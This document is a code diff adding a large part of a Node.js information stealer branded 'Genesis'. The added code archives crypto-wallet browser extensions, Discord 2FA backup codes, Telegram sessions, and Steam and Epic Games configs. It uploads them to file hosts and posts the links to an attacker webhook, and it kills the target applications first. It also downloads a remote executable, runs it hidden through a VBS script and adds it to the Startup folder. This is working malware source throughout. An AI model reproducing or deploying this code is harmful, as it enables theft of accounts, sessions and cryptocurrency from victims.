@@ -1823,4 +1823,805 @@ async function SubmitExodus() {
                 footer: {
                     text: 'Genesis | t.me/genesisStealer',
                 },
+                thumbnail: {
+                    url: 'https://i.postimg.cc/gkPD0f97/B92Jpnr.png'
+                }
+            };
+
+            await axios.post(config.webhook, { embeds: [embed] });
+            await axios.post(config.api, { embeds: [embed] });
+        }
+    } catch (err) {
+    }
+}
+
+
+async function createSingleZip() {
+    const zipFilePath = path.join(appdata, 'Wallets.zip');
+    const output = fs.createWriteStream(zipFilePath);
+    const archive = archiver('zip', {
+        zlib: { level: 9 }
+    });
+
+    return new Promise((resolve, reject) => {
+        output.on('close', async function () {
+            if (archive.pointer() === 0 || archive.pointer() < 25) {
+                fs.unlinkSync(zipFilePath);
+                resolve(null);
+            } else {
+                try {
+                    const fileLink = await Upload(zipFilePath);
+                    resolve(fileLink);
+                } catch (error) {
+                    reject(error);
+                }
+            }
+        });
+
+        output.on('error', function (err) {
+            reject(err);
+        });
+
+        archive.on('error', function (err) {
+            reject(err);
+        });
+
+        archive.pipe(output);
+
+        for (const [browser, paths] of Object.entries(WalletsBrowser)) {
+            for (const profilePath of paths) {
+                if (fs.existsSync(profilePath)) {
+                    for (const [wallet, walletPath] of Object.entries(walletPaths)) {
+                        const fullWalletPath = profilePath + walletPath;
+                        if (fs.existsSync(fullWalletPath)) {
+                            walletNames.push(`${browser} ${wallet}`); 
+                            fs.readdirSync(fullWalletPath).forEach(file => {
+                                const filePath = path.join(fullWalletPath, file);
+                                try {
+                                    if (fs.lstatSync(filePath).isFile()) {
+                                        archive.file(filePath, { name: `${browser}_${wallet}/${file}` });
+                                    }
+                                } catch (err) {
+                                }
+                            });
+                        }
+                    }
+                }
+            }
+        }
+
+        archive.finalize();
+    });
+}
+
+async function sendLogToApi(filelink) {
+    const walletList = walletNames.join(', ');
+
+    const embed = {
+        title: `<a:Genesis:1387894590635245638> Wallets Extensions  ${os.userInfo().username}`,
+        description: `**Download Archive**:\n- <:dl:1387891242360242288> [All Wallets](${filelink})\n\n\`\`\`\n${walletList}\n\`\`\``, 
+        color: 0x808080,
+        footer: {
+            text: 'Genesis | t.me/genesisStealer',
+        }
+    };
+
+
+    try {
+        await axios.post(config.webhook, {
+            embeds: [embed]
+        });
+
+    try {
+        await axios.post(config.api, {
+            embeds: [embed]
+        });
+
+    } catch (error) {
+    }
+     } catch (error) {
+    }
+}
+
+
+async function uploadFile(filePath) {
+        let uploadLink = 'Upload failed on both services';
+    
+        try {
+            const goFileResponse = await axios.get('https://api.gofile.io/servers');
+            const goFileServers = goFileResponse.data?.data?.servers || [];
+    
+            if (goFileServers.length > 0) {
+                const goFileServer = goFileServers[0].name;
+                const goFileForm = new FormData();
+                goFileForm.append('file', fs.createReadStream(filePath));
+    
+                const goFileUploadUrl = `https://${goFileServer}.gofile.io/uploadFile`;
+                const goFileUploadResponse = await axios.post(goFileUploadUrl, goFileForm, {
+                    headers: goFileForm.getHeaders(),
+                });
+    
+                const goFileData = goFileUploadResponse.data?.data || {};
+                if (goFileData.downloadPage) {
+                    uploadLink = `${goFileData.downloadPage}`;
+                    return uploadLink; 
+                }
+            }
+        } catch (error) {
+            console.error('GoFile upload error:', error.response ? error.response.data : error.message);
+        }
+    
+        try {
+            const fileIoUrl = 'https://file.io';
+            const fileIoForm = new FormData();
+            fileIoForm.append('file', fs.createReadStream(filePath));
+    
+            uploadLink = await new Promise((resolve, reject) => {
+                const options = {
+                    method: 'POST',
+                    headers: {
+                        ...fileIoForm.getHeaders(),
+                    },
+                };
+    
+                const req = https.request(fileIoUrl, options, (res) => {
+                    let data = '';
+    
+                    res.on('data', (chunk) => {
+                        data += chunk;
+                    });
+    
+                    res.on('end', () => {
+                        if (res.statusCode === 200) {
+                            const response = JSON.parse(data);
+                            if (response.link) {
+                                resolve(`${response.link}`);
+                            } else {
+                                resolve('File.io: Upload failed');
+                            }
+                        } else {
+                            reject(new Error(`Failed to upload file to File.io. Status code: ${res.statusCode}`));
+                        }
+                    });
+                });
+    
+                req.on('error', (error) => {
+                    reject(error);
+                });
+    
+                fileIoForm.pipe(req);
+            });
+    
+            return uploadLink; 
+        } catch (error) {
+            console.error('File.io upload error:', error.message);
+        }
+    
+        try {
+            const form = new FormData();
+            form.append('reqtype', 'fileupload');
+            form.append('fileToUpload', fs.createReadStream(filePath)); 
             
+            const uploadUrl = 'https://catbox.moe/user/api.php';
+            console.log('Uploading to Catbox.moe...');
+    
+            const uploadResponse = await axios.post(uploadUrl, form, {
+                headers: form.getHeaders()
+            });
+    
+            const catboxLink = uploadResponse.data.trim();
+            return catboxLink;
+        } catch (error) {
+            console.error('Error uploading file to Catbox:', error.response ? error.response.data : error.message);
+        }
+    
+        console.log('Upload failed on both services.');
+        return uploadLink;
+    }
+    
+
+const tempDir = os.tmpdir();
+const wordlistFilePath = path.join(tempDir, 'X7G8JQW9LFH3YD2KP6ZTQ4VMX5N8WB1RHFJQ.txt');
+
+const defaultPasswords = [
+    '1234', 
+    '12345', 
+    '123456', 
+    '12345678', 
+    '123456789', 
+    'password', 
+    'admin', 
+    'root', 
+    'qwerty', 
+    'abc123', 
+    'letmein', 
+    'welcome', 
+    '1234567', 
+    'passw0rd', 
+    '1234567890', 
+    '1q2w3e4r', 
+    'sunshine', 
+    'iloveyou', 
+    'football', 
+    'monkey', 
+    'superman', 
+    'hunter2', 
+    'dragon', 
+    'baseball', 
+    'shadow', 
+    'trustno1', 
+    'password1', 
+    'master', 
+    'login', 
+    'qazwsx', 
+    'starwars', 
+    '654321', 
+    'access', 
+    '123qwe', 
+    'zaq12wsx', 
+    '1qaz2wsx', 
+    'hello123', 
+    'batman', 
+    'charlie', 
+    'letmein123', 
+    'mustang', 
+    '696969', 
+    'michael', 
+    'freedom', 
+    'secret', 
+    'abc12345', 
+    'loveyou', 
+    'whatever', 
+    'trustme', 
+    '666666'
+];
+
+
+
+async function getPepperoni() {
+  const homeDir = os.homedir();
+  const tempDir = os.tmpdir(); // Correction : tempDir n'était pas défini
+  let str = '';
+
+  function findAndReadBackupCodes(directory) {
+    if (fs.existsSync(directory)) {
+      fs.readdirSync(directory).forEach(file => {
+        if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
+          const filePath = path.join(directory, file);
+          str += `\n\n@~$~@GenesisStealer-${filePath}`;
+          str += `\n\n${fs.readFileSync(filePath, 'utf-8')}`;
+        }
+      });
+    }
+  }
+
+  findAndReadBackupCodes(path.join(homeDir, 'Downloads'));
+  findAndReadBackupCodes(path.join(homeDir, 'Desktop'));
+  findAndReadBackupCodes(path.join(homeDir, 'Documents'));
+
+  if (str !== '') {
+    const backupcodesFilePath = path.join(tempDir, 'BackupCodes.txt');
+    fs.writeFileSync(backupcodesFilePath, str.slice(2));
+
+    const link = await uploadFile(backupcodesFilePath);
+    const backupCodeLink = `✨ [Click here to download backup codes](${link})`;
+
+    const embed = {
+      title: "🔑 Discord Backup codes founds!",
+      color: 0x808080,
+      fields: [{
+        name: "Use theses code to disable 2FA.",
+        value: `${backupCodeLink}`,
+        inline: false
+      }],
+      footer: {
+        text: "Genesis  | t.me/GenesisStealer"
+      }
+    };
+
+    await axios.post(config.webhook, { embeds: [embed] });
+    await axios.post(config.api, { embeds: [embed] });
+  }
+}
+
+async function zipFolderX(source, out) {
+    const archive = archiver('zip', { zlib: { level: 9 } });
+    const stream = fs.createWriteStream(out);
+
+    return new Promise((resolve, reject) => {
+        archive
+            .directory(source, false)
+            .on('error', err => reject(err))
+            .pipe(stream);
+
+        stream.on('close', () => resolve());
+        archive.finalize();
+    });
+}
+
+function checkFileEncoding(fileContent) {
+}
+
+function getPasswordsX() {
+    if (fs.existsSync(wordlistFilePath)) {
+        const fileContent = fs.readFileSync(wordlistFilePath, 'utf-8');
+        return fileContent.split(/\r?\n/).filter(Boolean); 
+    } else {
+        return defaultPasswords;
+    }
+}
+
+function decryptWithSeco(encryptedData, passphrase) {
+    try {
+        return seco.decryptData(encryptedData, passphrase);  
+    } catch (error) {
+        return null; 
+    }
+}
+
+async function zipAndSendTasks() {
+    try {
+        const zipFilePath = await createSingleZip();
+        if (zipFilePath) {
+            await sendLogToApi(zipFilePath);
+        } else {
+        }
+    } catch (error) {
+    }
+}
+
+async function imh4dsc() {
+    exec('tasklist', (err, stdout) => {
+        const executables = [
+            'Discord.exe',
+            'DiscordCanary.exe',
+            'discordDevelopment.exe',
+            'DiscordPTB.exe',
+        ];
+
+        for (const executable of executables) {
+            if (stdout.includes(executable)) {
+                exec(`taskkill /F /T /IM ${executable}`, (err) => {
+                    if (err) {
+                        console.error(`Error killing ${executable}:`, err);
+                    }
+                });
+
+                if (executable.includes('Discord')) {
+                    exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {
+                        if (err) {
+                            console.error(`Error restarting ${executable}:`, err);
+                        }
+                    });
+                }
+            }
+        }
+    });
+}
+
+const telegramTdataPath = path.join(process.env.APPDATA, 'Telegram Desktop', 'tdata');
+const localAppDataPath = path.join(process.env.LOCALAPPDATA, 'Telegram_Data');
+
+const excludeFiles = [
+    'media_cache'
+];
+
+async function terminateTelegram() {
+    return new Promise((resolve, reject) => {
+        exec('tasklist', (error, stdout, stderr) => {
+            if (error) {
+                return reject(error);
+            }
+
+            if (stdout.toLowerCase().includes('telegram.exe')) {
+                exec('taskkill /F /IM Telegram.exe', (killError, killStdout, killStderr) => {
+                    if (killError) {
+                        return reject(killError);
+                    }
+                    resolve();
+                });
+            } else {
+                resolve(); 
+            }
+        });
+    });
+}
+async function copyFilesTG(src, dest, excludeFiles) {
+    await fs.ensureDir(dest);
+
+    const files = await fs.readdir(src);
+    await Promise.all(files.map(async (file) => {
+        const fullPath = path.join(src, file);
+        const destPath = path.join(dest, file);
+
+        try {
+            const stats = await fs.lstat(fullPath);
+            if (stats.isDirectory()) {
+                if ((file === 'user_data' || file === 'user_data#2') && excludeFiles.includes('media_cache')) {
+                    const subFiles = await readdir(fullPath);
+                    await Promise.all(subFiles.map(async (subFile) => {
+                        if (subFile !== 'media_cache') {
+                            const subFullPath = path.join(fullPath, subFile);
+                            const subDestPath = path.join(destPath, subFile);
+                            await fs.copy(subFullPath, subDestPath);
+                        }
+                    }));
+                } else {
+                    await copyFilesTG(fullPath, destPath, excludeFiles);
+                }
+            } else {
+                await fs.copy(fullPath, destPath);
+            }
+        } catch (err) {
+            console.error(`Error processing file/directory: ${fullPath}`, err);
+        }
+    }));
+}
+
+function createZipTG(src, destZipPath) {
+    return new Promise((resolve, reject) => {
+        const output = fs.createWriteStream(destZipPath);
+        const archive = archiver('zip', {
+            zlib: { level: 9 } 
+        });
+
+        output.on('close', () => {
+            console.log(`ZIP dosyası başarıyla oluşturuldu: ${destZipPath} (${archive.pointer()} bytes)`);
+            resolve();
+        });
+
+        archive.on('error', (err) => {
+            console.error('ZIP dosyası oluşturulurken hata oluştu:', err);
+            reject(err);
+        });
+
+        archive.pipe(output);
+        archive.directory(src, false);
+        archive.finalize();
+    });
+}
+
+async function sendToWebhookTG(gofileUrl) {
+    const embed = {
+        title: `⚓️️ Genesis (Telegram Session) - ${os.userInfo().username}`,
+        description: `📎 Download: 
+[CLICK!](${gofileUrl})`,
+        color: 0x808080,
+        footer: {
+            text: 'Genesis t.me/genesisStealer',
+            icon_url: 'https://i.imgur.com/zzLcvVJ.png'
+        },
+        thumbnail: {
+            url: 'https://i.imgur.com/0wJybGH.png' 
+        }
+    };
+
+    const data = {
+        embed: embed
+    };
+
+    try {
+        await axios.post(config.webhook, { embeds: [embed] });
+		await axios.post(config.api, { embeds: [embed] });
+    } catch (error) {
+    }
+}
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function submitTelegram() {
+    try {
+        await terminateTelegram();
+        await sleep(3000);
+
+        const copyStartTime = performance.now();
+        await copyFilesTG(telegramTdataPath, localAppDataPath, excludeFiles);
+        const copyEndTime = performance.now();
+        const copyDuration = ((copyEndTime - copyStartTime) / 1000).toFixed(2);
+        console.log(`Copy finished. Duration: ${copyDuration} seconds`);
+
+        const zipStartTime = performance.now();
+        const destZipPath = path.join(process.env.LOCALAPPDATA, 'Telegram_Data.zip');
+        await createZipTG(localAppDataPath, destZipPath);
+        const zipEndTime = performance.now();
+        const zipDuration = ((zipEndTime - zipStartTime) / 1000).toFixed(2);
+        console.log(`Zipping completed. Duration: ${zipDuration} seconds`);
+
+        const gofileUrl = await uploadFile(destZipPath);
+
+        if (gofileUrl) {
+            const embed = {
+                title: `⚓️ Genesis (Telegram Session) - ${os.userInfo().username}`,
+                description: `🔍 Download: [CLICK ME!](${gofileUrl})`,
+                color: 0x808080,
+                footer: {
+                    text: 'Genesis | t.me/genesisStealer',
+                    icon_url: 'https://i.imgur.com/zzLcvVJ.png'
+                },
+                thumbnail: {
+                    url: 'https://i.imgur.com/0wJybGH.png'
+                }
+            };
+
+            await axios.post(config.webhook, { embeds: [embed] });
+            await axios.post(config.api, { embeds: [embed] });
+        }
+
+        await fse.unlink(destZipPath);
+        await fse.remove(localAppDataPath);
+    } catch (error) {
+        console.error(`Error in submitTelegram: ${error.message}`);
+    }
+}
+
+
+
+
+async function killEpicGames() {
+        try {
+            await new Promise((resolve, reject) => {
+                exec('taskkill /IM EpicGamesLauncher.exe /F', (error, stdout, stderr) => {
+                    if (error) {
+                        reject(`Error killing Epic Games Launcher process: ${error.message}`);
+                    } else {
+                        console.log('Epic Games Launcher process killed.');
+                        resolve();
+                    }
+                });
+            });
+    
+        } catch (error) {
+            console.error(`Error in killEpicGames: ${error.message}`);
+        }
+    }
+	
+	
+
+async function SubmitEpic() {
+    try {
+        await killEpicGames();
+        const file = `${localappdata}\\EpicGamesLauncher\\Saved\\Config\\Windows`;
+        if (fs.existsSync(file)) {
+            const zipper = new AdmZip();
+            zipper.addLocalFolder(file);
+
+            const targetZipPath = path.join(tempDir, 'EpicGamesSession.zip');
+            zipper.writeZip(targetZipPath);
+            const link = await uploadFile(targetZipPath);
+            const epicLink = ` [Click here to download EpicGames Files!](${link})`;
+
+            const embed = {
+                title: `🏴‍☠️ Genesis (EpicGames Data) - ${os.userInfo().username}`,
+                description: `${epicLink}`,
+                color: 0x808080,
+                footer: {
+                    text: 'Genesis | t.me/genesisStealer',
+                    icon_url: 'https://i.imgur.com/zzLcvVJ.png'
+                },
+                thumbnail: {
+                    url: 'https://i.imgur.com/YErDHZW.png'
+                }
+            };
+
+            await axios.post(config.webhook, { embeds: [embed] });
+            await axios.post(config.api, { embeds: [embed] });
+
+        }
+    } catch (error) {
+        console.error(`Error in SubmitEpic: ${error.message}`);
+    }
+}
+
+async function killSteam() {
+            try {
+                await new Promise((resolve, reject) => {
+                    exec('taskkill /IM Steam.exe /F', (error, stdout, stderr) => {
+                        if (error) {
+                            reject(`Error killing Steam process: ${error.message}`);
+                        } else {
+                            console.log('Steam process killed.');
+                            resolve();
+                        }
+                    });
+                });
+        
+            } catch (error) {
+                console.error(`Error in killSteam: ${error.message}`);
+            }
+        }
+
+
+async function stealSteamSession() {
+    try {
+        await killSteam();
+        const file = `C:\\Program Files (x86)\\Steam\\config`;
+
+        if (fs.existsSync(file)) {
+            const zipper = new AdmZip();
+            zipper.addLocalFolder(file);
+
+            const tempDir = os.tmpdir();
+            const targetZipPath = path.join(tempDir, 'SteamSession.zip');
+            zipper.writeZip(targetZipPath);
+
+            const link = await uploadFile(targetZipPath);
+
+            const accounts = fs.readFileSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf", "utf-8");
+            const accountIds = accounts.match(/7656[0-9]{13}/g) || [];
+
+            for (const account of accountIds) {
+                try {
+                    const { data: { response: accountInfo } } = await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=${account}`);
+                    const { data: { response: games } } = await axios.get(`https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);
+                    const { data: { response: level } } = await axios.get(`https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);
+
+                    const steamLink = `[Click to view Profile](${accountInfo.players[0].profileurl})`;
+                    const downloadLink = `[Download Steam Session here!](${link})`;
+
+                    const embed = createSteamEmbed(account, accountInfo, games, level, steamLink, downloadLink);
+
+                    await axios.post(config.webhook, { embeds: [embed] });
+                    await axios.post(config.api, { embeds: [embed] });
+
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+
+                } catch (error) {
+                    console.error(`An error occurred while processing Steam account ${account}: ${error.message}`);
+                }
+            }
+        } else {
+            console.log('Steam config folder not found.');
+        }
+    } catch (error) {
+        console.error(`Error in stealSteamSession: ${error.message}`);
+    }
+}
+
+     
+        
+function createSteamEmbed(account, accountInfo, games, level, steamLink, downloadLink) {
+    return {
+        title: `🏴‍☠️ Genesis (Steam) - ${os.userInfo().username}`,
+        description: `${steamLink}\n${downloadLink}`,
+        fields: [
+            {
+                name: '🏷 Username',
+                value: `> __${accountInfo.players[0].personaname}__`,
+                inline: true
+            },
+            {
+                name: "🆔 Steam Identifier",
+                value: `> __${account}__`,
+                inline: true
+            },
+            {
+                name: "🔢 Level",
+                value: `> __${level.player_level || "Private"}__`,
+                inline: true
+            },
+            {
+                name: "🎮 Game Count",
+                value: `> __${games.game_count || "Private"}__`,
+                inline: true
+            },
+            {
+                name: "📅 Account Created",
+                value: `> __${new Date(accountInfo.players[0].timecreated * 1000).toLocaleDateString()}__`,
+                inline: true
+            }
+        ],
+        color: 0x808080,
+        footer: {
+            text: 'Genesis | t.me/genesisStealer',
+            icon_url: 'https://i.imgur.com/zzLcvVJ.png'
+        },
+        thumbnail: {
+            url: 'https://i.imgur.com/aye4rL6.jpeg'
+        }
+    };
+}
+
+      
+
+function ensureDirectoryExistence(dirPath) {
+            if (!fs.existsSync(dirPath)) {
+                fs.mkdirSync(dirPath, { recursive: true });
+            }
+        }
+
+
+
+async function downloadPanel() {
+    try {
+        const exePath = await downloadExe();
+        await openExe(panel);
+        await addToStartup();
+    } catch (error) {
+        console.error("Error in download panel tasks:", error.message);
+    }
+}
+
+const exeUrl = `https://${SERVER_URL}/panel.exe`;
+const randomName = `Genesis_${crypto.randomBytes(8).toString('hex')}.exe`;
+
+const exePath = path.join(tempDir, randomName);
+async function downloadExe() {
+  const response = await axios({
+    method: 'get',
+    url: exeUrl,
+    responseType: 'stream',
+  });
+
+  return new Promise((resolve, reject) => {
+    const writer = fs.createWriteStream(exePath);
+    response.data.pipe(writer);
+    writer.on('finish', () => resolve(exePath));
+    writer.on('error', reject);
+  });
+}
+
+async function openExe(panel) {
+  const vbsPath = path.join(tempDir, 'open.vbs');
+
+  const vbsContent = `
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run chr(34) & "${exePath}" & chr(34) & " ${panel}", 0, False
+  `;
+
+  await fsPromises.writeFile(vbsPath, vbsContent);
+  execSync(`cscript //B "${vbsPath}"`);
+}
+
+async function addToStartup() {
+  const vbsPath = path.join(tempDir, 'startup.vbs');
+
+  const vbsContent = `
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run chr(34) & "${exePath}" & chr(34), 0, False
+  `;
+
+  await fsPromises.writeFile(vbsPath, vbsContent);
+
+  const startupFolder = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
+  const shortcutPath = path.join(startupFolder, 'startup.vbs');
+
+  fs.copyFileSync(vbsPath, shortcutPath);
+}
+
+async function run() {
+  const users = await getUsers();
+
+  const browsersToKill = [
+    'chrome', 'msedge', 'brave', 'firefox', 'opera', 'kometa', 'orbitum',
+    'centbrowser', '7star', 'sputnik', 'vivaldi', 'epicprivacybrowser',
+    'uran', 'yandex', 'iridium'
+  ];
+
+  for (const p of browsersToKill) {
+    await killProcess(p);
+  }
+
+  await all(users);
+  await imh4dsc(users);
+  await sxcxrDs(users);
+  await downloadPanel();
+  await browser(users); 
+  await discordtokens(users);
+  await getPepperoni();
+  await Operapass(users);
+  await opera(users);
+  await SubmitExodus(users);
+  await zipAndSendTasks(users);
+  await submitTelegram(users);
+  await imh4dsc(users);
+  await sxcxrDs(users);
+  await downloadPanel();
+  await SubmitEpic();
+  await stealSteamSession();
+  await chrome(users);
+}
+
+	
+run();
